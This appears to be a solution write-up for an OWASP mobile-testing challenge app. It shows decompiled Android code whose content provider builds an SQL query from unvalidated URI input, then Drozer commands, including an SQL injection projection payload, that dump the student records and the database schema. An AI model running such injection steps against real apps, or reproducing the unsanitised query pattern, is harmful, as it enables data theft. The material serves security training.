# OMTG-Android - 18. SQL Injection Content Provider - Solution

> MSTG-PLATFORM-2: "All inputs from external sources and the user are validated and if necessary sanitized. This includes data received via the UI, IPC mechanisms such as intents, custom URLs, and network sources."

**Summary of the challenge:** The application is exposing a function used for querying student data from database through a [content provider](https://developer.android.com/guide/topics/manifest/provider-element) to the user and other applications. No user input can be handled as trusted data source without validation, otherwise the implemented functionality can be exploited via malicious code. The challenge application is vulnerable against SQL injection through the exposed content provider, which means the user input taints the implemented database query with an SQL statement. A malicious application can obtain the SQLite database records (student name and grade) via SQL injection attack. 

The affected content provider `sg.vp.owasp_mobile.provider.College` is defined in the `AndroidManifest.xml` file and accessible to any application if the device is running Android 4.1 or older version. The default value of `android:exported` attribute is `true` on Android API 16 or below, providing accessible content provider functionality for other applications.

Snippet of the `AndroidManifest.xml` file:
```xml
<provider android:name="sg.vp.owasp_mobile.OMTG_Android.OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation" android:authorities="sg.vp.owasp_mobile.provider.College"/>
```

Since the source of the application is not obfuscated, it is possible to obtain the implemented database query and other important methods by decompiling the APK file using [JADX-GUI](https://github.com/skylot/jadx):
```java
public class OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation extends ContentProvider {
  static final Uri CONTENT_URI = Uri.parse(URL);
  static final String CREATE_DB_TABLE = " CREATE TABLE students (_id INTEGER PRIMARY KEY AUTOINCREMENT,  name TEXT NOT NULL,  grade TEXT NOT NULL);";
  static final String DATABASE_NAME = "College";
  static final int DATABASE_VERSION = 1;
  static final String GRADE = "grade";
  static final String NAME = "name";
  static final String PROVIDER_NAME = "sg.vp.owasp_mobile.provider.College";
  static final int STUDENTS = 1;
  private static HashMap<String, String> STUDENTS_PROJECTION_MAP = null;
  static final String STUDENTS_TABLE_NAME = "students";
  static final int STUDENT_ID = 2;
  static final String URL = "content://sg.vp.owasp_mobile.provider.College/students";
  static final String _ID = "_id";
  static final UriMatcher uriMatcher = new UriMatcher(-1);
  private SQLiteDatabase db;

  [...]

  public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    SQLiteQueryBuilder qb = new SQLiteQueryBuilder();
    qb.setTables(STUDENTS_TABLE_NAME);
    switch (uriMatcher.match(uri)) {
      case 1:
        qb.setProjectionMap(STUDENTS_PROJECTION_MAP);
        break;
      case 2:
        qb.appendWhere("_id=" + ((String) uri.getPathSegments().get(1)));
          Log.e("appendWhere", ((String) uri.getPathSegments().get(1)).toString());
          break;
      default:
        throw new IllegalArgumentException("Unknown URI " + uri);
    }
    if (sortOrder == null || sortOrder == "") {
      sortOrder = NAME;
    }
    Cursor c = qb.query(this.db, projection, selection, selectionArgs, null, null, sortOrder);
    c.setNotificationUri(getContext().getContentResolver(), uri);
    return c;
  }
  [...]
}
```

Retrieving entry from the database using the application (intended functionality):

<img src="https://user-images.githubusercontent.com/55597077/67484830-c5f56d80-f660-11e9-959b-7bb665e45950.png" width="296">

Due to the `_id` input is not validated (any input string is interpreted), the implemented query can lead to SQL injection:
`qb.appendWhere("_id=" + ((String) uri.getPathSegments().get(1)));`

The vulnerability can be exploited by any other application on the device. [Drozer](https://github.com/FSecureLABS/drozer) is a security assessment framework for testing Android applications. It provides scanning features for vulnerabilities by taking the role of a native Android application and interacting with Dalvik Virtual Machine, other applications' IPC endpoints and the OS beneath.

Install Drozer Agent apk (Drozer Server) on the Android device and Drozer client on a Windows/Linux or MacOS system to interact with the mobile device. Start the server on the device by pushing the `On` button in the Drozer Agent then issue the following commands from the host system to launch the console:
```bash
adb forward tcp:31415 tcp:31415
c:\Python2\python.exe c:\Python2\Scripts\drozer console connect
```

List all of the installed packages with `run app.package.list` command, then identify the attack surface with the `run app.package.attacksurface sg.vp.owasp_mobile.omtg_android` command.

One content provider is exported.

To determine the URI of the exported content provider which can be queried, send the `run scanner.provider.finduris -a sg.vp.owasp_mobile.omtg_android` command.

To obtain the database entries, invoke the content provider using the exposed URI `run app.provider.query content://sg.vp.owasp_mobile.provider.College/students`. 

The `content://` scheme is a prefix which identifies a content URI pointing to an Android content provider. The authority `sg.vp.owasp_mobile.provider.College` identifies the provider itself. the Android operating system looks up the authority in its list of registered providers and their authorities. The substring `students` is a path, which can be used to identify subsets of the provider data.

Drozer console output:
```cmd
C:\>adb forward tcp:31415 tcp:31415
31415

C:\>c:\Python2\python.exe c:\Python2\Scripts\drozer console connect
Selecting f7f9ba94507a6afc (unknown sdk 4.1.2)

            ..                    ..:.
           ..o..                  .r..
            ..a..  . ....... .  ..nd
              ro..idsnemesisand..pr
              .otectorandroidsneme.
           .,sisandprotectorandroids+.
         ..nemesisandprotectorandroidsn:.
        .emesisandprotectorandroidsnemes..
      ..isandp,..,rotectorandro,..,idsnem.
      .isisandp..rotectorandroid..snemisis.
      ,andprotectorandroidsnemisisandprotec.
     .torandroidsnemesisandprotectorandroid.
     .snemisisandprotectorandroidsnemesisan:
     .dprotectorandroidsnemesisandprotector.

drozer Console (v2.4.4)
dz> run app.package.list
android (Android System)
com.android.backupconfirm (com.android.backupconfirm)
com.android.browser (Browser)
[...]
com.mwr.dz (drozer Agent)
sg.vp.owasp_mobile.omtg_android (Attack me if u can)
dz> run app.package.attacksurface sg.vp.owasp_mobile.omtg_android
Attack Surface:
  1 activities exported
  0 broadcast receivers exported
  1 content providers exported
  0 services exported
    is debuggable
dz> run scanner.provider.finduris -a sg.vp.owasp_mobile.omtg_android
Scanning sg.vp.owasp_mobile.omtg_android...
Able to Query    content://sg.vp.owasp_mobile.provider.College/students
Unable to Query  content://sg.vp.owasp_mobile.provider.College/
Able to Query    content://sg.vp.owasp_mobile.provider.College/students/
Unable to Query  content://sg.vp.owasp_mobile.provider.College

Accessible content URIs:
  content://sg.vp.owasp_mobile.provider.College/students/
  content://sg.vp.owasp_mobile.provider.College/students
dz> run app.provider.query content://sg.vp.owasp_mobile.provider.College/students
| _id | name           | grade |
| 3   | David Williams | A     |
| 1   | John Smith     | B     |
| 4   | Richard Davis  | A+    |
| 2   | Robert Johnson | C     |
```

Type `run scanner.provider.injection -a sg.vp.owasp_mobile.omtg_android` to reveal SQL injection in the content provider. Send custom SQL query to expose the database tables using `run app.provider.query content://sg.vp.owasp_mobile.provider.College/students --projection "* FROM SQLITE_MASTER WHERE type='table';--"` statement.

```cmd
dz> run scanner.provider.injection -a sg.vp.owasp_mobile.omtg_android
Scanning sg.vp.owasp_mobile.omtg_android...
Not Vulnerable:
  content://sg.vp.owasp_mobile.provider.College
  content://sg.vp.owasp_mobile.provider.College/

Injection in Projection:
  content://sg.vp.owasp_mobile.provider.College/students/
  content://sg.vp.owasp_mobile.provider.College/students

Injection in Selection:
  content://sg.vp.owasp_mobile.provider.College/students/
  content://sg.vp.owasp_mobile.provider.College/students
dz> run app.provider.query content://sg.vp.owasp_mobile.provider.College/students --projection "* FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql                                                                                                      |
| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                                              |
| table | students         | students         | 4        | CREATE TABLE students (_id INTEGER PRIMARY KEY AUTOINCREMENT,  name TEXT NOT NULL,  grade TEXT NOT NULL) |
| table | sqlite_sequence  | sqlite_sequence  | 5        | CREATE TABLE sqlite_sequence(name,seq)                                                                   |
```

As it was noted before, the issue can be exploited only on Android version 4.1 or below. Since the default value of the `android:exported` attribute is `true` without explicit definition in the manifest.
